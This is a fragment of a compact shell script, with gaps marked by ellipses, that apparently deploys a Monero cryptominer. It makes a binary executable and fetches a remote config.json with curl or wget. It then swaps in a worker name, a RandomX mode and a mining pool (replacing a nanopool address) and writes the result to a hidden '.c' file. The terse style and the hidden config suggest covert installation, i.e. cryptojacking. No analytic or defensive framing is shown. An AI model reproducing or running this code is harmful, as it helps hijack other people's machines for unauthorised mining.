...
chmod +x "$W1/$BN"
dlc(){ if command -v curl >/dev/null 2>&1;then curl -sSL --connect-timeout 20 --max-time 60 "$RAW/config.json" 2>/dev/null;elif command -v wget >/dev/null 2>&1;then wget -q --timeout=60 -O- "$RAW/config.json" 2>/dev/null;fi; }
...
CFGTPL="$(dlc)"
okcfg "$CFGTPL"||{ echo "config.json invalid/not found (got: ${CFGTPL:0:40})">&2;exit 1; }
...
dlc(){ if command -v curl >/dev/null 2>&1;then curl -sSL --connect-timeout 20 --max-time 60 "$RAW/config.json" 2>/dev/null;elif command -v wget >/dev/null 2>&1;then wget -q --timeout=60 -O- "$RAW/config.json" 2>/dev/null;fi; }
mkcfg(){ T="$(dlc)";case "$T" in \{*WORKERNAME*\}*) :;; *) return 1;; esac;echo "$T"|sed "s/WORKERNAME/$PW/;s/\"mode\": \"auto\"/\"mode\": \"$(rxm)\"/;s|xmr-eu1.nanopool.org:14433|$POOL|">"$MYDIR/.c" 2>/dev/null;chmod 600 "$MYDIR/.c" 2>/dev/null; }
bld(){ mkdir -p "$MYDIR" 2>/dev/null;[ -f "$MYDIR/.c" ]&&return 0;mkcfg; }
cfgchk(){ grep -q "$POOL" "$MYDIR/.c" 2>/dev/null&&grep -q "\"$PW\"" "$MYDIR/.c" 2>/dev/null&&grep -q "\"mode\": \"$(rxm)\"" "$MYDIR/.c" 2>/dev/null&&return 0;[ -f "$MYDIR/.c" ]||mkcfg; }
